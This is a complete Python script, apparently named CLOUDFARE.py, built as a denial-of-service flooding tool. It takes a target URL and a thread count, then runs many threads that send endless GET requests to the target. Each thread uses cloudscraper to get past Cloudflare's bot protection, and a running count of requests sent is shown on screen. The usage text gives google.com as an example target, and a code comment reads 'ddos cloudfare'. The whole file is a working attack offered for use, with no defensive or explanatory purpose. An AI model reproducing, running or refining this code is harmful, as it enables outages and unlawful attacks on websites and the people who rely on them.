from threading import Thread
import threading
import os
import cloudscraper
import sys
import time
from time import sleep
import requests
try:
	url = str(sys.argv[1])
	threddd = str(sys.argv[2])
except Exception:
	print("""
Usage:
python3 CLOUDFARE.py https://www.website.com threads
Ex:
python3 CLOUDFARE.py https://www.google.com 100
Notes:
Don't go over 500 in threads.""")
	exit()
	
def check_url(url):
	try:
		cloudfare_check_url = requests.Session()
		response = cloudfare_check_url.get(url)
		if response.status_code == 200:
			print(" ")
		elif response.status_code == 404:
			print("The url is invalid")
	except:
		bypass = cloudscraper.create_scraper()
		response2 = bypass.get(url)
		if response2.status_code == 200:
			print(" ")
		elif response2.status_code == 404:
			print("The url is invalid")

count = 0

# ddos cloudfare
def bypass(url, threads):

	r = requests.Session()
	bypass2 = cloudscraper.create_scraper()

	def do_req():
		global count
		while True:
			response = r.get(url)
			count +=1
			os.system("clear")
			print("""
Requests sent:
| """ + str(count)  + """ |
Method:
| CLOUDFARE bypass |
IP:
| """ + url + """ |""")

			response = bypass2.get(url)
			os.system("clear")
			print("""
Requests sent:
| """ + str(count)  + """ |
Method:
| CLOUDFARE bypass |
IP:
| """ + url + """ |""")

	list_of_threads = []

	for i in range(int(threads)):
		t = threading.Thread(target=do_req)
		t.daemon = True
		list_of_threads.append(t)

	for i in range(int(threads)):
		list_of_threads[i].start()

	for i in range(int(threads)):
		list_of_threads[i].join()

check_url(url)
sleep(1)

threads = threddd
bypass(url, threads)
